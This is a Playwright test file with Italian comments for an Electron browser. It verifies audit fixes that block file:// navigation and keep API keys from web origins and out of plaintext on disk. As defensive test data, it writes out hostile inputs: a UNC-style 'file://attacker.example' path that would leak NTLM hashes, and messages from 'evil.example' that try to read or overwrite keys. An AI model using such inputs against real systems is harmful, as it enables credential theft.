// Verifiche di sicurezza (audit giugno 2026):
//   #1 — una pagina web non può far navigare il browser verso file:// (su
//        Windows un percorso UNC fa trapelare l'hash NTLM) né altri schemi
//        non-web via window.open / window.location.
//   #3 — le chiavi API (settings.apiKeys) sono cifrate a riposo nel storage.json
//        (mai in chiaro su disco), pur restando in chiaro in memoria per chi
//        legge i settings.
//
// Gli assert affermano il SUCCESSO della difesa: senza i fix questi test
// diventano rossi (compare un tab file://, oppure la chiave appare in chiaro
// nel file su disco).

import { test, expect } from './fixtures/electron.mjs';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

test('#1 una pagina web non può aprire file:// (window.open) né navigarci (location)', async ({ app, openTab, testServer }) => {
  const page = await testServer.openReady(openTab, `
    <!doctype html><meta charset="utf-8"><title>nav-block</title>
    <body><p>pagina di test</p></body>
  `);
  const startUrl = page.url();
  expect(startUrl.startsWith('http://')).toBe(true);

  // a) window.open verso file:// → setWindowOpenHandler deve negare (nessun tab).
  await page.evaluate(() => {
    try { window.open('file:///C:/Windows/System32/drivers/etc/hosts'); } catch (_) {}
    try { window.open('file://attacker.example/share/x'); } catch (_) {}
  });
  // b) window.location verso file:// → will-navigate deve fare preventDefault.
  await page.evaluate(() => {
    try { window.location.href = 'file://attacker.example/share/y'; } catch (_) {}
  });

  // Diamo tempo a un'eventuale (indesiderata) navigazione/apertura di propagarsi.
  await new Promise((r) => setTimeout(r, 800));

  // Nessuna finestra/tab deve essere finita su uno schema file:.
  const fileWindows = app.windows().filter((w) => {
    try { return w.url().toLowerCase().startsWith('file:'); } catch (_) { return false; }
  });
  expect(fileWindows.length).toBe(0);

  // La pagina di partenza è rimasta sul suo URL http (non è stata dirottata).
  expect(page.url()).toBe(startUrl);
});

test('#1b i link mailto:/tel: vengono consegnati all\'OS, file:// no', async ({ app, openTab, testServer }) => {
  // Stub di shell.openExternal nel main: così il test verifica la DELEGA senza
  // lanciare davvero il client di posta. tabs.js tiene lo stesso oggetto `shell`
  // (require('electron')), quindi mutarne la proprietà è visibile al codice reale.
  await app.evaluate(({ shell }) => {
    globalThis.__ext = [];
    shell.openExternal = (u) => { globalThis.__ext.push(String(u)); return Promise.resolve(); };
  });

  const page = await testServer.openReady(openTab, `
    <!doctype html><meta charset="utf-8"><title>os-scheme</title><body><p>x</p>
  `);
  const startUrl = page.url();

  await page.evaluate(() => { try { window.location.href = 'mailto:mario@esempio.it?subject=ciao'; } catch (_) {} });
  await page.evaluate(() => { try { window.open('tel:+39055123456'); } catch (_) {} });
  await page.evaluate(() => { try { window.open('file://attacker.example/share/x'); } catch (_) {} });

  await new Promise((r) => setTimeout(r, 700));

  const ext = await app.evaluate(() => globalThis.__ext || []);
  expect(ext.some((u) => u.startsWith('mailto:'))).toBe(true);
  expect(ext.some((u) => u.startsWith('tel:'))).toBe(true);
  // file:// non deve MAI finire a shell.openExternal (resta solo bloccato).
  expect(ext.some((u) => u.toLowerCase().startsWith('file:'))).toBe(false);

  // La pagina non è stata dirottata e nessun tab file:// è comparso.
  expect(page.url()).toBe(startUrl);
  const fileWindows = app.windows().filter((w) => {
    try { return w.url().toLowerCase().startsWith('file:'); } catch (_) { return false; }
  });
  expect(fileWindows.length).toBe(0);
});

test('#2 i canali privilegiati non trapelano le chiavi API a un\'origine web', async ({ app, shell }) => {
  // `shell` attende la fine del boot (firstWindow + domcontentloaded). Senza,
  // la semina qui sotto può correre con l'inizializzazione settings del main:
  // un read-modify-write del boot sovrascrive il seed e la chiave viene letta
  // vuota → flake ("Received ''"). Stessa cura del test #3.
  void shell;
  const SECRET = 'sk-or-v1-WEB-LEAK-' + Date.now();
  // Semina la apiKey direttamente nello storage (scrittura sincrona in memoria),
  // come stato di partenza deterministico: evita il percorso async di
  // applySettingsUpdate, che da solo introdurrebbe un flake di timing.
  await app.evaluate(async (_electron, secret) => {
    const S = globalThis.__filoStorage;
    const cur = (await S.get('settings')).settings || {};
    await S.set({ settings: { ...cur, apiKeys: { openrouter: secret } } });
  }, SECRET);

  // Lettura da una PAGINA INTERNA: deve vedere la chiave (le Opzioni la editano).
  const filoView = await app.evaluate(async () => {
    const MSG = globalThis.SN_MSG.MSG;
    const r = await globalThis.SN_HANDLE_MESSAGE({ type: MSG.GET_SETTINGS }, { url: 'filo://options/options.html' });
    return r.settings.apiKeys && r.settings.apiKeys.openrouter;
  });
  expect(filoView).toBe(SECRET);

  // Lettura da un'ORIGINE WEB (content script su una pagina http): niente chiavi.
  const webView = await app.evaluate(async () => {
    const MSG = globalThis.SN_MSG.MSG;
    const get = await globalThis.SN_HANDLE_MESSAGE({ type: MSG.GET_SETTINGS }, { url: 'https://evil.example/page' });
    const stor = await globalThis.SN_HANDLE_MESSAGE({ type: '_storage:get', keys: null }, { url: 'https://evil.example/page' });
    return {
      settingsApiKeys: get.settings.apiKeys,
      storageApiKeys: stor.value && stor.value.settings && stor.value.settings.apiKeys,
    };
  });
  expect(webView.settingsApiKeys).toBeFalsy();
  expect(webView.storageApiKeys).toBeFalsy();

  // Scrittura da un'origine web: non può iniettare/sovrascrivere una apiKey,
  // ma una preferenza benigna (modello) passa. La chiave originale resta intatta.
  const afterWebWrite = await app.evaluate(async () => {
    const MSG = globalThis.SN_MSG.MSG;
    await globalThis.SN_HANDLE_MESSAGE(
      { type: MSG.UPDATE_SETTINGS, settings: { apiKeys: { openrouter: 'sk-ATTACKER' }, models: { x: 'm' } } },
      { url: 'https://evil.example/page' },
    );
    // Niente clear da origine web.
    const cleared = await globalThis.SN_HANDLE_MESSAGE({ type: '_storage:clear' }, { url: 'https://evil.example/page' });
    const r = await globalThis.SN_HANDLE_MESSAGE({ type: MSG.GET_SETTINGS }, { url: 'filo://options/options.html' });
    return { key: r.settings.apiKeys && r.settings.apiKeys.openrouter, clearOk: cleared.ok };
  });
  expect(afterWebWrite.key).toBe(SECRET); // non sovrascritta dall'attaccante
  expect(afterWebWrite.clearOk).toBe(false); // clear da web rifiutato
});

test('#3 le chiavi API sono cifrate nel storage.json (mai in chiaro su disco)', async ({ app, shell }) => {
  // `shell` attende app.firstWindow() + load: senza, il primo app.evaluate
  // parte mentre l'app sta ancora navigando al boot e il contesto viene
  // distrutto ("Execution context was destroyed"). Gli altri test del file
  // passano proprio perché usano un fixture (shell/openTab) che aspetta il boot.
  void shell;
  const SECRET = 'sk-or-v1-SEGRETISSIMA-' + Date.now();
  const userData = await app.evaluate(() => process.env.FILO_USER_DATA);
  const canEncrypt = await app.evaluate(({ safeStorage }) => {
    try { return safeStorage.isEncryptionAvailable(); } catch (_) { return false; }
  });

  // Scrive una apiKey reale e forza la scrittura sincrona su disco.
  // NB: app.evaluate passa il modulo `electron` come PRIMO argomento; il nostro
  // valore (SECRET) arriva come secondo.
  await app.evaluate(async (_electron, secret) => {
    const S = globalThis.__filoStorage;
    await S.set({ settings: { apiKeys: { openrouter: secret }, theme: 'auto' } });
    S.flushSync();
  }, SECRET);

  const raw = readFileSync(join(userData, 'storage.json'), 'utf8');
  const onDisk = JSON.parse(raw);

  // In MEMORIA la chiave resta leggibile in chiaro (chi legge i settings non cambia).
  const memKey = await app.evaluate(async () => {
    const got = await globalThis.__filoStorage.get('settings');
    return got.settings && got.settings.apiKeys && got.settings.apiKeys.openrouter;
  });
  expect(memKey).toBe(SECRET);

  if (canEncrypt) {
    // Su disco: niente segreto in chiaro, e il blob cifrato presente.
    expect(raw).not.toContain(SECRET);
    expect(onDisk.settings.apiKeys).toBeFalsy();
    expect(String(onDisk.settings.apiKeysEnc || '')).toContain('safeStorage:v1:');
  } else {
    // Senza keyring OS (es. Linux headless): fallback in chiaro, nessuna perdita
    // di dati. Lo dichiariamo esplicitamente invece di fingere una verifica.
    expect(onDisk.settings.apiKeys.openrouter).toBe(SECRET);
    test.info().annotations.push({ type: 'note', description: 'safeStorage non disponibile: cifratura a riposo non verificata su questo ambiente' });
  }
});
